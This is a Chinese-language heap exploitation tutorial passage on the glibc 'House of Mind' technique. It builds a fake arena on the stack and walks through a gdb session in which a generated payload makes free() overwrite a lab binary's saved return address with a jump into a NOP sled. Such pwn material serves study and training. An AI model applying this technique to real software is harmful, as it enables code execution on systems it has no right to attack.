## House of Mind

这是需要构造的内存布局

```
STACK:   ^
         |
         |      0xRAND_VAL     av->system_mem (av + 1848)
         |         ...
         |      pushed EIP     av->fastbins[0]
         |      pushed EBP     av->max_fast
         |      0x00000000     av->mutex
         |
```

`av->mutex` 需要使用一个局部临时变量进行替代, 所以我们需要以 `av->mutex` 在栈中的地址(堆栈中存放EBP的地址减4)作为 fake chunk 的地址, 所以这个地址使需要提前知道的, 可以通过 `gdb attach vul` 得到.

完整调试过程如下

```
➜  test1 gcc vul.c -g -m32 -mpreferred-stack-boundary=2 -mno-accumulate-outgoing-args -o vul
➜  test1 gdb -q vul
Reading symbols from vul...done.
(gdb) b fvuln
Breakpoint 1 at 0x80484d3: file vul.c, line 6.
(gdb) r
Starting program: /home/vagrant/pwn/test/test1/vul

Breakpoint 1, fvuln () at vul.c:6
6	  char *ptr  = malloc(1024);
(gdb) info f
Stack level 0, frame at 0xbffff668:
 eip = 0x80484d3 in fvuln (vul.c:6); saved eip = 0x8048591
 called by frame at 0xbffff670
 source language c.
 Arglist at 0xbffff660, args:
 Locals at 0xbffff660, Previous frame's sp is 0xbffff668
 Saved registers:
  ebp at 0xbffff660, eip at 0xbffff664
(gdb) q
A debugging session is active.

	Inferior 1 [process 12042] will be killed.

Quit anyway? (y or n) y
➜  test1 EBPMINUS4 = 0xbffff660-4
zsh: command not found: EBPMINUS4
➜  test1 gcc -g -o exp exp.c
➜  test1 ./exp > payload
➜  test1 gdb -q vul
Reading symbols from vul...done.
(gdb) b 25
Breakpoint 1 at 0x804856e: file vul.c, line 25.
(gdb) r < ./payload
Starting program: /home/vagrant/pwn/test/test1/vul < ./payload
ptr found at 0x804b008
good heap alignment found on malloc() 720 (0x8100280)

Breakpoint 1, fvuln () at vul.c:25
25	  free(ptr);
(gdb) x/wx 0x8100000
0x8100000:	0xbffff65c
(gdb) x/3wx 0xbffff65c
0xbffff65c:	0x00000000	0xbffff668	0x08048591
(gdb) n
26	  free(ptr2);
(gdb) n
28	  return ret;
(gdb) x/3wx 0xbffff65c
0xbffff65c:	0x00000000	0xbffff668	0x08100278
(gdb) x/3i 0x08100278
   0x8100278:	jmp    0x8100290
   0x810027a:	nop
   0x810027b:	nop
(gdb) x/20i 0x8100290
   0x8100290:	nop
   0x8100291:	nop
   0x8100292:	nop
   0x8100293:	nop
   0x8100294:	jmp    0x81002ad
```

